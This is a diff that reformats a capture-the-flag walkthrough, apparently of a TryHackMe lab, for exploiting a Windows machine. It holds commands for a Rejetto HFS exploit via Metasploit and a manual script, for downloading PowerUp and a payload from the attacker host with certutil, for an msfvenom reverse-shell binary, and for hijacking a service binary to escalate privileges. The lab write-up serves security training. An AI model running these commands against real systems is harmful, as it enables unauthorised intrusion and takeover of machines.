@@ -14,7 +14,9 @@
 
 **Scan the machine with nmap. What is the other port running a web server on?**
 
-`nmap -A` 10.10.248.189
+```
+nmap -A 10.10.248.189
+```
 
 <figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -30,17 +32,14 @@ Google this
 
 **Use Metasploit to get an initial shell. What is the user flag?**
 
-`msfconsole`&#x20;
-
-`use exploit/windows/http/rejetto_hfs_exec`&#x20;
-
-`set LHOST 10.10.62.157`&#x20;
-
-`set RHOSTS 10.10.181.159`&#x20;
-
-`set RPORT 8080`
-
-`exploit`
+```
+msfconsole 
+use exploit/windows/http/rejetto_hfs_exec 
+set LHOST 10.10.62.157 
+set RHOSTS 10.10.181.159 
+set RPORT 8080
+exploit
+```
 
 **Option #2  Without Metasploit to get an initial shell. What is the user flag?**
 
@@ -54,13 +53,12 @@ Because I performed this on a tryhackme attacker box which has port 80 in user t
 
 <figure><img src="../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>
 
-`nc -nvlp 443`
-
-`cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .`
-
-`python2 -m SimpleHTTPServer 81`
-
-`python2 exploit.py 10.10.181.159 8080`
+```
+nc -nvlp 443
+cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .
+python2 -m SimpleHTTPServer 81
+python2 exploit.py 10.10.181.159 8080
+```
 
 <figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -72,42 +70,48 @@ Because I performed this on a tryhackme attacker box which has port 80 in user t
 
 **Kali**
 
-`wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`&#x20;
-
-`python2 -m SimpleHTTPServer 81`
+```
+wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 
+python2 -m SimpleHTTPServer 81
+```
 
 **Windows**
 
-`certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1`&#x20;
-
-`. .\PowerUp.ps1`&#x20;
-
-`Invoke-AllChecks`
+```
+certutil -urlcache -f http://10.10.228.214:81/PowerUp.ps1 PowerUp.ps1 
+. .\PowerUp.ps1 
+Invoke-AllChecks
+```
 
 <figure><img src="../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.228.214 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o` ASCService.exe
-
-
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.228.214 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+```
 
 I couldn't delete the ASCService.exe but I could replace it when I copied the file over with certutil
 
 **Victim**&#x20;
 
-`cd C:\Program Files (x86)\IObit\Advanced SystemCare`\
-`sc stop AdvancedSystemCareService9`&#x20;
-
-`certutil -urlcache -f http://10.10.228.214:81/ASCService.exe ASCService.exe`
+```
+cd C:\Program Files (x86)\IObit\Advanced SystemCare
+sc stop AdvancedSystemCareService9 
+certutil -urlcache -f http://10.10.228.214:81/ASCService.exe ASCService.exe
+```
 
 **Kali**
 
-`nc -lvnp 4443`
+```
+nc -lvnp 4443
+```
 
 **Victim**
 
-`sc start AdvancedSystemCareService9`
+```
+sc start AdvancedSystemCareService9
+```
 
 ![](<../../.gitbook/assets/image (3) (1).png>)
 
